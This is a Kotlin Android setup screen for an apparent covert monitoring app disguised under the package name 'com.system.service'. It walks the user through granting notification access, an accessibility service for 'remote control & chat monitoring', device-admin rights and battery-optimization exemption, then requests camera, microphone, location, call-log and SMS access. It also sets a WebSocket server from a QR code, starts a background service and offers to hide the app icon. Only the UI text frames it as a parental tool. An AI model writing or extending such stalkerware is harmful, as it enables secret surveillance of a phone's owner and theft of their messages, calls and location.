package com.system.service.setup

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.journeyapps.barcodescanner.ScanContract
import com.journeyapps.barcodescanner.ScanIntentResult
import com.journeyapps.barcodescanner.ScanOptions
import com.system.service.R
import com.system.service.core.CoreService
import com.system.service.core.DeviceAdminReceiver
import com.system.service.monitors.NotificationMonitor

class SetupActivity : AppCompatActivity() {

    private var currentStep = 0

    private val qrScanLauncher = registerForActivityResult(ScanContract()) { result: ScanIntentResult ->
        result.contents?.let { url ->
            if (url.startsWith("ws://") || url.startsWith("wss://")) {
                CoreService.SERVER_URL = url
                getSharedPreferences("config", MODE_PRIVATE)
                    .edit().putString("server_url", url).apply()
                showStep(1)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup)

        val savedUrl = getSharedPreferences("config", MODE_PRIVATE)
            .getString("server_url", null)
        if (savedUrl != null) CoreService.SERVER_URL = savedUrl

        showStep(0)
    }

    override fun onResume() {
        super.onResume()
        Handler(Looper.getMainLooper()).postDelayed({
            if (currentStep in 1..6 && isPermissionGranted(currentStep)) {
                showStep(currentStep + 1)
            }
        }, 1500)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) showStep(7)
    }

    private fun showStep(step: Int) {
        currentStep = step
        when (step) {
            0 -> updateUI("Setup", "Server URL",
                "Parent app se QR code scan karo
ya default use karo", "📷 Scan QR Code") {
                val options = ScanOptions().apply {
                    setDesiredBarcodeFormats(ScanOptions.QR_CODE)
                    setPrompt("Parent app ki Settings se QR scan karo")
                    setCameraId(0); setBeepEnabled(false)
                }
                qrScanLauncher.launch(options)
            }
            1 -> updateUI("1/6", "Notification Access",
                "Required for notification monitoring", "Enable") {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
            2 -> updateUI("2/6", "Accessibility Access",
                "Required for remote control & chat monitoring", "Enable") {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            3 -> updateUI("3/6", "Device Management",
                "Required for screen lock", "Activate") {
                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    ComponentName(this, DeviceAdminReceiver::class.java))
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device security")
                startActivity(i)
            }
            4 -> updateUI("4/6", "Battery Optimization",
                "Keep service running always in background", "Disable") {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            }
            5 -> updateUI("5/6", "Display Permission",
                "Required for overlay alerts", "Allow") {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")))
            }
            6 -> updateUI("6/6", "Final Permissions",
                "Camera, Mic, Location, Calls, SMS", "Allow All") {
                val permsToRequest = mutableListOf<String>()
                val allPerms = arrayOf(
                    android.Manifest.permission.CAMERA,
                    android.Manifest.permission.RECORD_AUDIO,
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.READ_CALL_LOG,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_PHONE_STATE
                )
                for (perm in allPerms) {
                    if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED)
                        permsToRequest.add(perm)
                }
                if (permsToRequest.isEmpty()) showStep(7) else requestPermissions(permsToRequest.toTypedArray(), 100)
            }
            7 -> showFinalStep()
        }
    }

    private fun showFinalStep() {
        currentStep = 7
        findViewById<TextView>(R.id.tvStep).text = "✅ Done!"
        findViewById<TextView>(R.id.tvTitle).text = "Setup Complete"
        findViewById<TextView>(R.id.tvDesc).text = "Service is now running in background"

        // Start service
        try { startForegroundService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}

        // Show hide icon button
        val btnAction = findViewById<Button>(R.id.btnAction)
        btnAction.text = "🙈 Hide App Icon"
        btnAction.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFFFF5722.toInt())
        btnAction.setOnClickListener {
            hideIcon()
            Toast.makeText(this, "Icon hidden! Use parent app to manage.", Toast.LENGTH_LONG).show()
            finishAffinity()
        }

        val btnNext = findViewById<Button>(R.id.btnNext)
        btnNext.text = "✅ Keep Icon Visible & Finish"
        btnNext.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF4CAF50.toInt())
        btnNext.setOnClickListener {
            finishAffinity()
        }
    }

    private fun hideIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, SetupActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    private fun isPermissionGranted(step: Int): Boolean {
        return when (step) {
            1 -> isNotificationEnabled()
            2 -> isAccessibilityEnabled()
            3 -> isDeviceAdminEnabled()
            4 -> (getSystemService(POWER_SERVICE) as PowerManager)
                    .isIgnoringBatteryOptimizations(packageName)
            5 -> Settings.canDrawOverlays(this)
            else -> true
        }
    }

    private fun isNotificationEnabled(): Boolean {
        val cn = ComponentName(this, NotificationMonitor::class.java)
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(cn.flattenToString()) == true
    }

    private fun isAccessibilityEnabled(): Boolean {
        // Fix: use full ComponentName to match exactly what Android stores
        val cn = ComponentName(packageName, "com.system.service.monitors.AccessibilityMonitor")
        val flat = cn.flattenToString()
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return enabled.contains(flat)
    }

    private fun isDeviceAdminEnabled(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
    }

    private fun updateUI(step: String, title: String, desc: String, btnText: String, action: () -> Unit) {
        findViewById<TextView>(R.id.tvStep).text = "Step $step"
        findViewById<TextView>(R.id.tvTitle).text = title
        findViewById<TextView>(R.id.tvDesc).text = desc
        val btnAction = findViewById<Button>(R.id.btnAction)
        btnAction.text = btnText
        btnAction.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF2196F3.toInt())
        btnAction.setOnClickListener { action() }
        val btnNext = findViewById<Button>(R.id.btnNext)
        btnNext.text = "Already Done - Next"
        btnNext.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF333333.toInt())
        btnNext.setOnClickListener { showStep(currentStep + 1) }
    }
}
